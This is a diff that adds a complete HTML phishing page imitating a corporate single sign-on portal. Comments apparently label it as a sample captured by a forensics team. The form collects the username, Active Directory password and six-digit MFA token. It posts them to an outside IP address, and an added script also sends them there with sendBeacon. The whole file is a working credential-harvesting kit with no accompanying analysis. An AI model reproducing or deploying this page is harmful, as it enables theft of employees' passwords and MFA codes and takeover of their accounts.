@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Corporate Identity Gateway - Sign In</title>
+  <!-- Rogue Harvester Captured DOM -->
+</head>
+<body style="background:#f4f5f7; font-family: sans-serif;">
+  <div style="width: 380px; margin: 100px auto; background: #fff; padding: 30px; border-radius: 4px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
+    <h2 style="color: #007dc1;">Single Sign-On Verification</h2>
+    <form id="phishForm" action="https://198.51.100.44/api/harvest" method="POST">
+      <input type="text" name="username" placeholder="Username / Email" style="width: 100%; margin-bottom: 12px; padding: 8px;" />
+      <input type="password" name="password" placeholder="Active Directory Password" style="width: 100%; margin-bottom: 12px; padding: 8px;" />
+      <input type="text" name="mfa_token" placeholder="6-digit Authenticator Token" style="width: 100%; margin-bottom: 12px; padding: 8px;" />
+      <button type="submit" style="background:#007dc1; color:#fff; width:100%; padding:10px; border:none; cursor:pointer;">Authenticate</button>
+    </form>
+    <script>
+      // Malicious payload captured by DFIR team
+      document.getElementById('phishForm').addEventListener('submit', function(e) {
+        navigator.sendBeacon('https://198.51.100.44/exfil', new FormData(this));
+      });
+    </script>
+  </div>
+</body>
+</html>
